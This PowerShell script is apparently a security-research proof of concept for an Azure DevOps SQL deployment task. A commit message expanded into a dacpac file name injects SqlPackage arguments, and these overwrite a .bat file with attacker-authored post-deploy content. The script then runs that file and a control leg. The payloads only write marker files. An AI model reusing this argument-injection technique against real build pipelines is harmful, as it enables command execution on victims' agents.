# Ceiling probe 5. How much of the generated deployment script does the attacker actually
# author. A dacpac carries pre-deployment and post-deployment scripts; if SqlPackage emits
# them verbatim then the injected /DeployScriptPath: writes a file whose CONTENT the attacker
# chose, not only whose path. Then run the written file as the extension says it is, with the
# whole transcript captured so the earlier non-firing leg can be diagnosed rather than guessed.

$ErrorActionPreference = 'Continue'
$here = Split-Path -Parent $MyInvocation.MyCommand.Path
$work = Join-Path $env:RUNNER_TEMP ("c5-" + [guid]::NewGuid().ToString('N').Substring(0,8))
foreach ($d in @('db','proj','victim')) { New-Item -ItemType Directory -Force -Path (Join-Path $work $d) | Out-Null }
$projDir = Join-Path $work 'proj'; $victimDir = Join-Path $work 'victim'
Write-Output ("PSVersion : " + $PSVersionTable.PSVersion + "   PSEdition : " + $PSVersionTable.PSEdition)
$sqlPackage = (Get-ChildItem "C:\Program Files\Microsoft SQL Server\*\DAC\bin\SqlPackage.exe" | Select-Object -First 1).FullName
Write-Output ("SqlPackage.exe  : " + $sqlPackage + "  v" + (Get-Item $sqlPackage).VersionInfo.FileVersion)

$nupkg = Join-Path $here 'taskmodulesqlutility-0.1.7.nupkg'
Copy-Item $nupkg (Join-Path $work 'pkg.zip')
Expand-Archive -Path (Join-Path $work 'pkg.zip') -DestinationPath (Join-Path $work 'pkg') -Force
$modFile = (Get-ChildItem -Recurse -Path (Join-Path $work 'pkg') -Filter 'SqlPackageOnTargetMachines.ps1' | Select-Object -First 1).FullName
Write-Output ("module sha256   : " + (Get-FileHash -Algorithm SHA256 $modFile).Hash.ToLower())
function Get-LiftedText([string]$file, [string[]]$names) {
    $tok = $null; $err = $null
    $ast = [System.Management.Automation.Language.Parser]::ParseFile($file, [ref]$tok, [ref]$err)
    $fns = $ast.FindAll({ param($n) $n -is [System.Management.Automation.Language.FunctionDefinitionAst] }, $true)
    $parts = @()
    foreach ($name in $names) {
        $f = $fns | Where-Object { $_.Name -eq $name } | Select-Object -First 1
        Write-Host ("  lifted verbatim : $name lines $($f.Extent.StartLineNumber)-$($f.Extent.EndLineNumber)")
        $parts += $f.Extent.Text
    }
    return ($parts -join "`r`n")
}
. ([scriptblock]::Create((Get-LiftedText $modFile @('Get-SqlPackageCmdArgs','ExecuteCommand'))))

# ------------------------------------------------- build a dacpac carrying pre/post deploy
Write-Output ""
Write-Output "################ A. build a dacpac with pre-deployment and post-deployment scripts"
$idx = Invoke-RestMethod 'https://api.nuget.org/v3-flatcontainer/microsoft.build.sql/index.json'
$sdkVer = ($idx.versions | Where-Object { $_ -notmatch '-' } | Select-Object -Last 1)
if (-not $sdkVer) { $sdkVer = ($idx.versions | Select-Object -Last 1) }
Write-Output ("  Microsoft.Build.Sql SDK version : " + $sdkVer)
Set-Content -Path (Join-Path $projDir 'global.json') -Encoding UTF8 -Value ('{ "msbuild-sdks": { "Microsoft.Build.Sql": "' + $sdkVer + '" } }')
Set-Content -Path (Join-Path $projDir 'Fab.sqlproj') -Encoding UTF8 -Value @'
<Project Sdk="Microsoft.Build.Sql">
  <PropertyGroup>
    <Name>Fab</Name>
    <DSP>Microsoft.Data.Tools.Schema.Sql.Sql160DatabaseSchemaProvider</DSP>
    <ModelCollation>1033, CI</ModelCollation>
  </PropertyGroup>
  <ItemGroup>
    <PreDeploy Include="predeploy.sql" />
    <PostDeploy Include="postdeploy.sql" />
  </ItemGroup>
</Project>
'@
Set-Content -Path (Join-Path $projDir 'Table1.sql') -Encoding UTF8 -Value 'CREATE TABLE [dbo].[T1] ([id] INT NOT NULL PRIMARY KEY);'

$BATMARK = Join-Path $victimDir 'PWNED-postdeploy-batch.txt'
$pre = @"
PRINT N'MSRCLAB-PREDEPLOY-001-BEGIN';
PRINT N'MSRCLAB-PREDEPLOY-002 quote " pct % amp & pipe | caret ^ paren ( )';
PRINT N'MSRCLAB-PREDEPLOY-003-END';
"@
$post = @"
PRINT N'MSRCLAB-POSTDEPLOY-001-BEGIN';
--& echo MSRC_POSTDEPLOY_BATCH_EXECUTED> "$BATMARK" &
PRINT N'MSRCLAB-POSTDEPLOY-003 tail';
PRINT N'MSRCLAB-POSTDEPLOY-004-END';
"@
Set-Content -Path (Join-Path $projDir 'predeploy.sql')  -Value $pre  -Encoding ASCII
Set-Content -Path (Join-Path $projDir 'postdeploy.sql') -Value $post -Encoding ASCII
Push-Location $projDir
$b = & dotnet build -c Release 2>&1 | Out-String
Pop-Location
($b -split "`r?`n") | Select-Object -Last 5 | ForEach-Object { Write-Output ("  build> " + $_.Trim()) }
$built = (Get-ChildItem -Recurse -Path $projDir -Filter 'Fab.dacpac' | Select-Object -First 1)
Write-Output ("  dacpac built : " + $(if ($built) { $built.FullName + "  " + $built.Length + " bytes" } else { "NO" }))
if (-not $built) { Write-Output "cannot continue without a dacpac"; exit 0 }
Copy-Item $built.FullName (Join-Path $work 'db\Fab.dacpac') -Force
# show the parts the attacker put inside the package
$z = Join-Path $work 'daczip'; New-Item -ItemType Directory -Force -Path $z | Out-Null
Copy-Item (Join-Path $work 'db\Fab.dacpac') (Join-Path $work 'dac.zip') -Force
Expand-Archive -Path (Join-Path $work 'dac.zip') -DestinationPath $z -Force
Get-ChildItem $z -Recurse -File | ForEach-Object { Write-Output ("  dacpac part> " + $_.Name + "  " + $_.Length + " bytes") }

& SqlLocalDB.exe create MSRCLAB5 2>&1 | Out-Null
& SqlLocalDB.exe start  MSRCLAB5 2>&1 | Out-Null
$target = '(localdb)\MSRCLAB5'

function RunLeg([string]$label, [string]$fileName, [string]$commitMsg) {
    Write-Host ""
    Write-Host "================ $label"
    Write-Host ("  committed file name : " + $fileName)
    Write-Host ("  commit message      : " + $commitMsg)
    $env:BUILD_SOURCEVERSIONMESSAGE = $commitMsg
    $dacpac = Join-Path $work ("db\" + $fileName)
    $a = Get-SqlPackageCmdArgs -dacpacFile $dacpac -targetMethod 'server' -serverName $target -databaseName 'Fabrikam' -additionalArguments ''
    Write-Host ("  argument string     : " + $a)
    try { $out = ExecuteCommand -FileName $sqlPackage -Arguments $a } catch { $out = "$_" }
    ($out -split "`r?`n") | Where-Object { $_.Trim() } | Select-Object -First 4 | ForEach-Object { Write-Host ("  out> " + $_.Trim()) }
}
Copy-Item (Join-Path $work 'db\Fab.dacpac') (Join-Path $work 'db\Fab%BUILD_SOURCEVERSIONMESSAGE%.dacpac') -Force

# ------------------------------------------------- A: emitted verbatim?
$bat = Join-Path $victimDir 'scheduled-task.bat'
Set-Content -Path $bat -Value "@echo off`r`necho ORIGINAL-MAINTENANCE-SCRIPT" -Encoding ASCII
$junk = Join-Path $work 'junk'
$msg = '.dacpac" /DeployScriptPath:"' + $bat + '" /DiagnosticsFile:"' + $junk
RunLeg 'A INJECT  /DeployScriptPath: onto an existing .bat' 'Fab%BUILD_SOURCEVERSIONMESSAGE%.dacpac' $msg

Write-Output ""
Write-Output "################ A results: how much of the file did the attacker author"
if (-not (Test-Path $bat)) { Write-Output "  no file written"; exit 0 }
$bytes = [System.IO.File]::ReadAllBytes($bat)
Write-Output ("  written file : " + $bat + "  " + $bytes.Length + " bytes")
Write-Output ("  first 8 bytes: " + (($bytes[0..7] | ForEach-Object { '{0:x2}' -f $_ }) -join ' '))
$lines = Get-Content $bat
Write-Output ("  line count   : " + $lines.Count)
Write-Output ("  ORIGINAL LINE STILL PRESENT : " + ((Get-Content $bat -Raw) -match 'ORIGINAL-MAINTENANCE-SCRIPT'))
foreach ($m in @('MSRCLAB-PREDEPLOY-001-BEGIN','MSRCLAB-PREDEPLOY-002','MSRCLAB-PREDEPLOY-003-END','MSRCLAB-POSTDEPLOY-001-BEGIN','MSRC_POSTDEPLOY_BATCH_EXECUTED','MSRCLAB-POSTDEPLOY-003','MSRCLAB-POSTDEPLOY-004-END')) {
    $hit = Select-String -Path $bat -Pattern ([regex]::Escape($m)) | Select-Object -First 1
    Write-Output ("  marker " + $m.PadRight(34) + " : " + $(if ($hit) { "line " + $hit.LineNumber } else { "ABSENT" }))
}
# the contiguous attacker run: from the first predeploy marker line to the last postdeploy marker line
$first = (Select-String -Path $bat -Pattern 'MSRCLAB-POSTDEPLOY-001-BEGIN' | Select-Object -First 1)
$last  = (Select-String -Path $bat -Pattern 'MSRCLAB-POSTDEPLOY-004-END'   | Select-Object -First 1)
if ($first -and $last) {
    $blk = $lines[($first.LineNumber-1)..($last.LineNumber-1)]
    Write-Output ("  POSTDEPLOY BLOCK, lines " + $first.LineNumber + " to " + $last.LineNumber + ", " + $blk.Count + " lines, " + (($blk -join "`r`n").Length) + " contiguous bytes:")
    $blk | ForEach-Object { Write-Output ("    | " + $_) }
    $src = (Get-Content (Join-Path $projDir 'postdeploy.sql'))
    Write-Output ("  SOURCE postdeploy.sql, " + $src.Count + " lines:")
    $src | ForEach-Object { Write-Output ("    s " + $_) }
    Write-Output ("  VERBATIM (block equals source, line for line) : " + (((($blk -join "`n").Trim()) -eq (($src -join "`n").Trim()))))
}
Write-Output ""
Write-Output "  full generated file, numbered:"
for ($i=0; $i -lt $lines.Count; $i++) { Write-Output ("  {0,4}| {1}" -f ($i+1), $lines[$i]) }

# ------------------------------------------------- B: run it as the extension says
Write-Output ""
Write-Output "################ B. run the replaced .bat, whole transcript"
Remove-Item $BATMARK -Force -ErrorAction SilentlyContinue
$log = Join-Path $work 'batout.txt'
cmd.exe /c "`"$bat`" > `"$log`" 2>&1"
$out = @(Get-Content $log -ErrorAction SilentlyContinue)
Write-Output ("  transcript lines : " + $out.Count)
for ($i=0; $i -lt $out.Count; $i++) { Write-Output ("  {0,4}> {1}" -f ($i+1), $out[$i]) }
Write-Output ("  POSTDEPLOY BATCH MARKER FILE WRITTEN : " + (Test-Path $BATMARK))
if (Test-Path $BATMARK) { Write-Output ("    content> " + (Get-Content $BATMARK -Raw).Trim()) }

# ------------------------------------------------- control
Write-Output ""
Write-Output "################ CONTROL, percent signs removed from the committed file name"
Remove-Item $BATMARK -Force -ErrorAction SilentlyContinue
Set-Content -Path $bat -Value "@echo off`r`necho ORIGINAL-MAINTENANCE-SCRIPT" -Encoding ASCII
RunLeg 'CONTROL percent signs removed' 'Fab.dacpac' $msg
Write-Output ("  batch bytes : " + (Get-Item $bat).Length + "   ORIGINAL LINE STILL PRESENT : " + ((Get-Content $bat -Raw) -match 'ORIGINAL-MAINTENANCE-SCRIPT'))
cmd.exe /c "`"$bat`" > `"$log`" 2>&1"
Write-Output ("  MARKER FILE WRITTEN : " + (Test-Path $BATMARK))

Write-Output ""
Write-Output "DONE"
exit 0
